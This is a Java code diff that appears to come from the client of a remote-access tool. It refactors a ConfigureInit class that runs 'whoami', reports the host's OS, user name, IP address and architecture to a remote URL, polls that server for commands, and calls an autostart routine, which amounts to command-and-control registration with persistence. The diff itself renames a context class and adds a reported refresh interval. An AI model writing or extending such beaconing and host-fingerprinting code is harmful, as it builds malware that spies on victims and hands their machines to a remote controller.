@@ -27,9 +27,10 @@ public class ConfigureInit {
     }
 
     public void configure(String url, String version) {
-        GetContext.CLIENT_NAME = Console.execute("whoami").get(1).replace("\\", "-");
-        GetContext.SENDER = new Sender(url);
-        webHandler = new WebHandler(url + "/command/" + GetContext.CLIENT_NAME);
+        SystemVariables.CLIENT_NAME = Console.execute("whoami").get(1).replace("\\", "-");
+        SystemVariables.SENDER = new Sender(url);
+        webHandler = new WebHandler(url + "/command/" + SystemVariables.CLIENT_NAME);
+        SystemVariables.REFRESHTIME = 1000;
         getConstants(version);
         autostart();
     }
@@ -41,13 +42,14 @@ public class ConfigureInit {
     }
 
     private void getConstants(String version) {
-        GetContext.SENDER.send("os", System.getProperty("os.name"));
-        GetContext.SENDER.send("user", System.getProperty("user.name"));
+        SystemVariables.SENDER.send("os", System.getProperty("os.name"));
+        SystemVariables.SENDER.send("user", System.getProperty("user.name"));
         try {
-            GetContext.SENDER.send("ip", InetAddress.getLocalHost().getHostAddress());
+            SystemVariables.SENDER.send("ip", InetAddress.getLocalHost().getHostAddress());
         } catch (UnknownHostException e) {
             e.printStackTrace();
         }
-        GetContext.SENDER.send("arch", version);
+        SystemVariables.SENDER.send("arch", version);
+        SystemVariables.SENDER.send("refresh", String.valueOf(SystemVariables.REFRESHTIME / 1000));
     }
 }
